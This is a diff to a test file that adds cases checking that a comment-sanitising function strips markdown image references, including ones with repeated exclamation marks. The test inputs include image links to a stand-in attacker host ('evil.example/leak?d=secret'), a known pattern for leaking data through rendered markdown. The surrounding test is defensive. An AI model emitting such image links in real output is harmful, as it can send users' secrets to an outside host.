@@ -142,6 +142,10 @@ test('designComment wraps the answer with the marker and the approval note, and 
   const refImage = designComment('## Understanding\nSee ![alt][r] and ![r] and ![x](https://evil.example/a.png) for context on the request.\n\n[r]: https://evil.example/leak?d=secret\n')!
   expect(refImage).not.toContain('![')
   expect(refImage).not.toContain('evil.example/a.png')
+  for (const bang of ['!', '!!', '!!!', '!!!!!']) {
+    const c = designComment(`## Understanding\nContext for the request follows. ${bang}[a][r] and ${bang}[r] here.\n\n[r]: https://evil.example/leak\n`)!
+    expect([bang, /!+\[/.test(c)]).toEqual([bang, false])
+  }
 })
 
 test('watchIssues is off by default, parsed when true, and in the approval hash only when on', () => {
